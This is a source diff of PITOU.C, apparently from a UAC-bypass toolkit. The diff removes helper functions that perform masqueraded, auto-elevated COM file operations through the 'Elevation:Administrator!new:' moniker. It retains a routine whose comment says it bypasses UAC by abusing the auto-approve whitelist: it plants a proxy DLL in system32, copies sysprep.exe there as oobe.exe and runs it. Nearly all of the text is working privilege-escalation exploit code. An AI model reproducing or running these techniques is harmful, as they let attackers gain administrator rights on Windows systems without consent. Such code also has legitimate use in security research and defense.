@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2014 - 2017
+*  (C) COPYRIGHT AUTHORS, 2014 - 2018
 *
 *  TITLE:       PITOU.C
 *
-*  VERSION:     2.70
+*  VERSION:     3.11
 *
-*  DATE:        25 Mar 2017
+*  DATE:        23 Nov 2018
 *
 *  Leo Davidson based IFileOperation auto-elevation.
 *
@@ -19,277 +19,18 @@
 #include "global.h"
 
 /*
-* ucmMasqueradedRenameElementCOM
-*
-* Purpose:
-*
-* Rename file/directory autoelevated.
-*
-*/
-BOOL ucmMasqueradedRenameElementCOM(
-    LPWSTR OldName,
-    LPWSTR NewName
-)
-{
-    BOOL                bCond = FALSE, bResult = FALSE;
-    IFileOperation     *FileOperation1 = NULL;
-    IShellItem         *psiDestDir = NULL;
-    HRESULT             r = E_FAIL;
-
-    do {
-
-        if ((OldName == NULL) || (NewName == NULL))
-            break;
-
-        r = CoCreateInstance(&CLSID_FileOperation, NULL,
-            CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER, &IID_IFileOperation, &FileOperation1);
-
-        if (r != S_OK) {
-            break;
-        }
-
-        if (FileOperation1 != NULL) {
-            FileOperation1->lpVtbl->Release(FileOperation1);
-        }
-
-        r = ucmMasqueradedCoGetObjectElevate(
-            T_CLSID_FileOperation,
-            CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER,
-            &IID_IFileOperation, 
-            &FileOperation1);
-
-        if (r != S_OK) {
-            break;
-        }
-        if (FileOperation1 == NULL) {
-            r = E_FAIL;
-            break;
-        }
-
-        FileOperation1->lpVtbl->SetOperationFlags(FileOperation1, g_ctx.IFileOperationFlags);
-
-        r = SHCreateItemFromParsingName(OldName, NULL, &IID_IShellItem, &psiDestDir);
-        if (r != S_OK) {
-            break;
-        }
-
-        r = FileOperation1->lpVtbl->RenameItem(FileOperation1, psiDestDir, NewName, NULL);
-        if (r != S_OK) {
-            break;
-        }
-
-        r = FileOperation1->lpVtbl->PerformOperations(FileOperation1);
-        if (r != S_OK) {
-            break;
-        }
-
-        psiDestDir->lpVtbl->Release(psiDestDir);
-        psiDestDir = NULL;
-
-        bResult = TRUE;
-
-    } while (bCond);
-
-    if (FileOperation1 != NULL) {
-        FileOperation1->lpVtbl->Release(FileOperation1);
-    }
-
-    if (psiDestDir != NULL) {
-        psiDestDir->lpVtbl->Release(psiDestDir);
-    }
-
-    return bResult;
-}
-
-/*
-* ucmMasqueradedCreateSubDirectoryCOM
-*
-* Purpose:
-*
-* Create directory autoelevated.
-*
-*/
-BOOL ucmMasqueradedCreateSubDirectoryCOM(
-    LPWSTR ParentDirectory,
-    LPWSTR SubDirectory
-)
-{
-    BOOL                bCond = FALSE, bResult = FALSE;
-    IFileOperation     *FileOperation1 = NULL;
-    IShellItem         *psiDestDir = NULL;
-    HRESULT             r = E_FAIL;
-
-    do {
-
-        if ((SubDirectory == NULL) || (ParentDirectory == NULL))
-            break;
-
-        r = CoCreateInstance(&CLSID_FileOperation, NULL,
-            CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER, &IID_IFileOperation, &FileOperation1);
-
-        if (r != S_OK) {
-            break;
-        }
-
-        if (FileOperation1 != NULL) {
-            FileOperation1->lpVtbl->Release(FileOperation1);
-        }
-
-        r = ucmMasqueradedCoGetObjectElevate(
-            T_CLSID_FileOperation,
-            CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER,
-            &IID_IFileOperation,
-            &FileOperation1);
-
-        if (r != S_OK) {
-            break;
-        }
-        if (FileOperation1 == NULL) {
-            r = E_FAIL;
-            break;
-        }
-
-        FileOperation1->lpVtbl->SetOperationFlags(FileOperation1, g_ctx.IFileOperationFlags);
-
-        r = SHCreateItemFromParsingName(ParentDirectory, NULL, &IID_IShellItem, &psiDestDir);
-        if (r != S_OK) {
-            break;
-        }
-
-        r = FileOperation1->lpVtbl->NewItem(FileOperation1, psiDestDir, FILE_ATTRIBUTE_DIRECTORY, SubDirectory, NULL, NULL);
-        if (r != S_OK) {
-            break;
-        }
-
-        r = FileOperation1->lpVtbl->PerformOperations(FileOperation1);
-        if (r != S_OK) {
-            break;
-        }
-
-        psiDestDir->lpVtbl->Release(psiDestDir);
-        psiDestDir = NULL;
-
-        bResult = TRUE;
-
-    } while (bCond);
-
-    if (FileOperation1 != NULL) {
-        FileOperation1->lpVtbl->Release(FileOperation1);
-    }
-
-    if (psiDestDir != NULL) {
-        psiDestDir->lpVtbl->Release(psiDestDir);
-    }
-
-    return bResult;
-}
-
-/*
-* ucmMasqueradedMoveFileCOM
-*
-* Purpose:
-*
-* Move file autoelevated.
-*
-*/
-BOOL ucmMasqueradedMoveFileCOM(
-    LPWSTR SourceFileName,
-    LPWSTR DestinationDir
-)
-{
-    BOOL                cond = FALSE;
-    IFileOperation     *FileOperation1 = NULL;
-    IShellItem         *isrc = NULL, *idst = NULL;
-    SHELLEXECUTEINFOW   shexec;
-    HRESULT             r = E_FAIL;
-
-    do {
-
-        if ((SourceFileName == NULL) || (DestinationDir == NULL))
-            break;
-
-        RtlSecureZeroMemory(&shexec, sizeof(shexec));
-
-        r = CoCreateInstance(&CLSID_FileOperation, NULL,
-            CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER, &IID_IFileOperation, &FileOperation1);
-
-        if (r != S_OK) {
-            break;
-        }
-
-        if (FileOperation1 != NULL) {
-            FileOperation1->lpVtbl->Release(FileOperation1);
-        }
-
-        r = ucmMasqueradedCoGetObjectElevate(
-            T_CLSID_FileOperation,
-            CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER,
-            &IID_IFileOperation,
-            &FileOperation1);
-
-        if (r != S_OK) {
-            break;
-        }
-        if (FileOperation1 == NULL) {
-            r = E_FAIL;
-            break;
-        }
-
-        FileOperation1->lpVtbl->SetOperationFlags(FileOperation1, g_ctx.IFileOperationFlags);
-
-        r = SHCreateItemFromParsingName(SourceFileName, NULL, &IID_IShellItem, &isrc);
-        if (r != S_OK) {
-            break;
-        }
-
-        r = SHCreateItemFromParsingName(DestinationDir, NULL, &IID_IShellItem, &idst);
-        if (r != S_OK) {
-            break;
-        }
-
-        r = FileOperation1->lpVtbl->MoveItem(FileOperation1, isrc, idst, NULL, NULL);
-        if (r != S_OK) {
-            break;
-        }
-        r = FileOperation1->lpVtbl->PerformOperations(FileOperation1);
-        if (r != S_OK) {
-            break;
-        }
-
-        idst->lpVtbl->Release(idst);
-        idst = NULL;
-        isrc->lpVtbl->Release(isrc);
-        isrc = NULL;
-
-    } while (cond);
-
-    if (FileOperation1 != NULL) {
-        FileOperation1->lpVtbl->Release(FileOperation1);
-    }
-    if (isrc != NULL) {
-        isrc->lpVtbl->Release(isrc);
-    }
-    if (idst != NULL) {
-        idst->lpVtbl->Release(idst);
-    }
-
-    return (SUCCEEDED(r));
-}
-
-/*
 * ucmStandardAutoElevation2
 *
 * Purpose:
 *
 * Bypass UAC by abusing appinfo g_lpAutoApproveEXEList
 *
-* UAC contain whitelist of trusted fusion processes with only names and no other special restrictions
-* Most of them unknown shit and list does not properly handled by system itself, use this fact.
+* UAC contain whitelist of trusted fusion processes with only names and no other special restrictions.
 *
 */
 BOOL ucmStandardAutoElevation2(
-    CONST PVOID ProxyDll,
-    DWORD ProxyDllSize
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
 )
 {
     BOOL  cond = FALSE, bResult = FALSE;
@@ -300,24 +41,24 @@ BOOL ucmStandardAutoElevation2(
 
         //source filename of dll
         RtlSecureZeroMemory(SourceFilePathAndName, sizeof(SourceFilePathAndName));
-        _strcpy(SourceFilePathAndName, g_ctx.szTempDirectory);
+        _strcpy(SourceFilePathAndName, g_ctx->szTempDirectory);
         _strcat(SourceFilePathAndName, UNBCL_DLL);
 
         if (!supWriteBufferToFile(SourceFilePathAndName, ProxyDll, ProxyDllSize))
             break;
 
         //copy %temp\unbcl.dll -> system32\unbcl.dll
-        if (!ucmMasqueradedMoveFileCOM(SourceFilePathAndName, g_ctx.szSystemDirectory))
+        if (!ucmMasqueradedMoveFileCOM(SourceFilePathAndName, g_ctx->szSystemDirectory))
             break;
 
         //source filename of process
         RtlSecureZeroMemory(SourceFilePathAndName, sizeof(SourceFilePathAndName));
-        _strcpy(SourceFilePathAndName, g_ctx.szSystemDirectory);
+        _strcpy(SourceFilePathAndName, g_ctx->szSystemDirectory);
         _strcat(SourceFilePathAndName, SYSPREP_DIR);
         _strcat(SourceFilePathAndName, SYSPREP_EXE);
 
         RtlSecureZeroMemory(DestinationFilePathAndName, sizeof(DestinationFilePathAndName));
-        _strcpy(DestinationFilePathAndName, g_ctx.szTempDirectory);
+        _strcpy(DestinationFilePathAndName, g_ctx->szTempDirectory);
         _strcat(DestinationFilePathAndName, OOBE_EXE);
 
         //system32\sysprep\sysprep.exe -> temp\oobe.exe
@@ -326,12 +67,12 @@ BOOL ucmStandardAutoElevation2(
         }
 
         //temp\oobe.exe -> system32\oobe.exe
-        if (!ucmMasqueradedMoveFileCOM(DestinationFilePathAndName, g_ctx.szSystemDirectory)) {
+        if (!ucmMasqueradedMoveFileCOM(DestinationFilePathAndName, g_ctx->szSystemDirectory)) {
             break;
         }
 
         RtlSecureZeroMemory(DestinationFilePathAndName, sizeof(DestinationFilePathAndName));
-        _strcpy(DestinationFilePathAndName, g_ctx.szSystemDirectory);
+        _strcpy(DestinationFilePathAndName, g_ctx->szSystemDirectory);
         _strcat(DestinationFilePathAndName, OOBE_EXE);
 
         bResult = supRunProcess(DestinationFilePathAndName, NULL);
@@ -356,20 +97,20 @@ BOOL ucmStandardAutoElevation2(
 *
 */
 BOOL ucmStandardAutoElevation(
-    UCM_METHOD Method,
-    CONST PVOID ProxyDll,
-    DWORD ProxyDllSize
+    _In_ UCM_METHOD Method,
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
 )
 {
-    BOOL	cond = FALSE, bResult = FALSE;
+    BOOL    cond = FALSE, bResult = FALSE;
     WCHAR   szSourceDll[MAX_PATH * 2];
     WCHAR   szTargetDir[MAX_PATH * 2];
     WCHAR   szTargetProcess[MAX_PATH * 2];
 
 
-    _strcpy(szSourceDll, g_ctx.szTempDirectory);
-    _strcpy(szTargetDir, g_ctx.szSystemDirectory);
-    _strcpy(szTargetProcess, g_ctx.szSystemDirectory);
+    _strcpy(szSourceDll, g_ctx->szTempDirectory);
+    _strcpy(szTargetDir, g_ctx->szSystemDirectory);
+    _strcpy(szTargetProcess, g_ctx->szSystemDirectory);
 
     switch (Method) {
 
@@ -459,41 +200,4 @@ BOOL ucmStandardAutoElevation(
     } while (cond);
 
     return bResult;
-}
-
-/*
-* ucmMasqueradedCoGetObjectElevate
-*
-* Purpose:
-*
-* CoGetObject elevation as admin.
-*
-*/
-HRESULT ucmMasqueradedCoGetObjectElevate(
-    _In_ LPWSTR clsid,
-    _In_ DWORD dwClassContext,
-    _In_ REFIID riid,
-    _Outptr_ void **ppv
-)
-{
-    HRESULT     r = E_FAIL;
-    BIND_OPTS3  bop;
-    WCHAR       szElevationMoniker[MAX_PATH];
-
-    if (clsid == NULL)
-        return r;
-
-    if (_strlen(clsid) > 64)
-        return r;
-
-    RtlSecureZeroMemory(szElevationMoniker, sizeof(szElevationMoniker));
-
-    _strcpy(szElevationMoniker, L"Elevation:Administrator!new:");
-    _strcat(szElevationMoniker, clsid);
-
-    RtlSecureZeroMemory(&bop, sizeof(bop));
-    bop.cbStruct = sizeof(bop);
-    bop.dwClassContext = dwClassContext;
-
-    return CoGetObject(szElevationMoniker, (BIND_OPTS *)&bop, riid, ppv);
 }
